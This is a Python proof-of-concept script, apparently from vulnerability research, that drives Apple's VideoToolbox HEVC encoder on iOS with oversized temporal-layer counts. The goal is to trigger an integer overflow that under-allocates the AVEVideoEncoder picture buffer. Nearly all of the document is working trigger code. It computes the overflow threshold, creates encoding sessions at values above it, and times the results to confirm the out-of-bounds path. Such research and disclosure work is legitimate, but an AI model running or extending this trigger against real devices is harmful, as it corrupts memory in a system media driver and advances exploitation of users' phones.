"""
AVEVideoEncoder NTL overflow boundary PoC v3 — iOS 26.6.1, iPhone 16
Targets CVE-2026-112466 / CVE-2026-112468..112470 / CVE-2026-112689

v3 changes vs v2:
  - Only 3 NTL values: 2050 (safe), 2060 (min overflow), 2100 (moderate overflow)
  - Avoids high NTL (>3000) that cause encoder stall
  - Adds timing around session create + invalidate phases
  - Reports memory before each probe
  - flush=True on every print so partial output survives a hard kill

Expected:
  NTL=2050: clean — session create fast, encode returns 0x0
  NTL=2060: DPB overflow — under-allocated buffer, encode may take longer or
            return error, but should NOT stall (NTL too low to spin indefinitely)
  NTL=2100: more pronounced overflow — larger OOB delta

If any NTL >= threshold shows SIGNIFICANTLY different timing vs the safe baseline,
that confirms the DPB overflow is triggering different code paths.
"""
import ctypes as C, sys, time

CF = C.CDLL("/System/Library/Frameworks/CoreFoundation.framework/CoreFoundation")
VT = C.CDLL("/System/Library/Frameworks/VideoToolbox.framework/VideoToolbox")
CV = C.CDLL("/System/Library/Frameworks/CoreVideo.framework/CoreVideo")
L  = C.CDLL("/usr/lib/libSystem.B.dylib")

CF.CFNumberCreate.restype = C.c_void_p
CF.CFNumberCreate.argtypes = [C.c_void_p, C.c_int, C.c_void_p]
CF.CFRelease.argtypes = [C.c_void_p]

L.mach_host_self.restype = C.c_uint32
L.host_statistics64.restype = C.c_int
L.host_statistics64.argtypes = [C.c_uint32, C.c_int, C.c_void_p, C.POINTER(C.c_uint32)]

def free_mb():
    vmstat = (C.c_uint32 * 38)()
    cnt = C.c_uint32(38)
    L.host_statistics64(L.mach_host_self(), 4, vmstat, C.byref(cnt))
    return vmstat[0] * 0x4000 // (1024 * 1024)

def cf_num(v):
    n = C.c_int32(v)
    return CF.CFNumberCreate(None, 3, C.byref(n))

VT.VTCompressionSessionCreate.restype = C.c_int32
VT.VTCompressionSessionCreate.argtypes = [
    C.c_void_p, C.c_int32, C.c_int32, C.c_uint32,
    C.c_void_p, C.c_void_p, C.c_void_p, C.c_void_p, C.c_void_p,
    C.POINTER(C.c_void_p),
]
VT.VTSessionSetProperty.restype = C.c_int32
VT.VTSessionSetProperty.argtypes = [C.c_void_p, C.c_void_p, C.c_void_p]
VT.VTCompressionSessionInvalidate.argtypes = [C.c_void_p]

class CMTime(C.Structure):
    _fields_ = [("value", C.c_int64), ("timescale", C.c_int32),
                ("flags", C.c_uint32), ("epoch", C.c_int64)]

VT.VTCompressionSessionEncodeFrame.restype = C.c_int32
VT.VTCompressionSessionEncodeFrame.argtypes = [
    C.c_void_p, C.c_void_p, CMTime, CMTime, C.c_void_p, C.c_void_p,
    C.POINTER(C.c_uint32),
]

CV.CVPixelBufferCreate.restype = C.c_int32
CV.CVPixelBufferCreate.argtypes = [
    C.c_void_p, C.c_ulong, C.c_ulong, C.c_uint32, C.c_void_p,
    C.POINTER(C.c_void_p),
]
CV.CVPixelBufferRelease.argtypes = [C.c_void_p]

kHEVC = 0x68766331
kYUV420 = 0x34323076

CALLBACK_TYPE = C.CFUNCTYPE(None, C.c_void_p, C.c_void_p, C.c_int32, C.c_void_p, C.c_void_p)
@CALLBACK_TYPE
def output_cb(*a): pass

W, H = 3840, 2160
ctu_w = (W + 63) // 64   # 60
ctu_h = (H + 63) // 64   # 34
unit = ctu_w * ctu_h * 1024  # 2,088,960
overflow_ntl = (1 << 32) // unit + 1  # first NTL that overflows


def probe(ntl):
    product_64 = unit * ntl
    product_32 = product_64 & 0xFFFFFFFF
    overflows = product_64 >= (1 << 32)
    tag = f"OVERFLOW->{product_32:#010x}({product_32//1024//1024}MB)" if overflows else f"safe({product_64//1024//1024}MB)"

    mem0 = free_mb()
    t0 = time.time()

    sess = C.c_void_p(0)
    st = VT.VTCompressionSessionCreate(
        None, W, H, kHEVC, None, None, None, output_cb, None, C.byref(sess)
    )
    t_create = time.time() - t0
    if st != 0 or not sess.value:
        print(f"  NTL={ntl:6d}: session_create_fail st={st:#x} t={t_create:.2f}s [{tag}]", flush=True)
        return

    ntl_key = C.c_void_p.in_dll(VT, "kVTCompressionPropertyKey_NumberOfTemporalLayers").value
    ntl_val = cf_num(ntl)
    st2 = VT.VTSessionSetProperty(sess.value, ntl_key, ntl_val)
    CF.CFRelease(ntl_val)
    if st2 != 0:
        VT.VTCompressionSessionInvalidate(sess.value)
        print(f"  NTL={ntl:6d}: ntl_rejected st2={st2:#x} t_create={t_create:.2f}s [{tag}]", flush=True)
        return

    pbuf = C.c_void_p(0)
    CV.CVPixelBufferCreate(None, W, H, kYUV420, None, C.byref(pbuf))

    t1 = time.time()
    pts = CMTime(value=0, timescale=90000, flags=1, epoch=0)
    dur = CMTime(value=3000, timescale=90000, flags=1, epoch=0)
    info = C.c_uint32(0)
    st4 = VT.VTCompressionSessionEncodeFrame(
        sess.value, pbuf.value, pts, dur, None, None, C.byref(info)
    )
    t_encode = time.time() - t1

    t2 = time.time()
    CV.CVPixelBufferRelease(pbuf.value)
    VT.VTCompressionSessionInvalidate(sess.value)
    t_inval = time.time() - t2

    mem1 = free_mb()
    print(
        f"  NTL={ntl:6d}: encode_st={st4:#x} info={info.value:#x} "
        f"t_create={t_create:.2f}s t_encode={t_encode:.2f}s t_inval={t_inval:.2f}s "
        f"mem_delta={mem1-mem0:+d}MB [{tag}]",
        flush=True
    )


# Threshold calculation
print(f"4K HEVC NTL boundary probe — {W}x{H}", flush=True)
print(f"DPB unit={unit} overflow at NTL>={overflow_ntl}", flush=True)
print(f"Testing: 2050 (safe), 2060 (min overflow), 2100 (moderate overflow)", flush=True)
print(flush=True)

for ntl in [2050, 2060, 2100]:
    print(f"  NTL={ntl:6d}: STARTING free={free_mb()}MB", flush=True)
    probe(ntl)

print("\nDONE", flush=True)
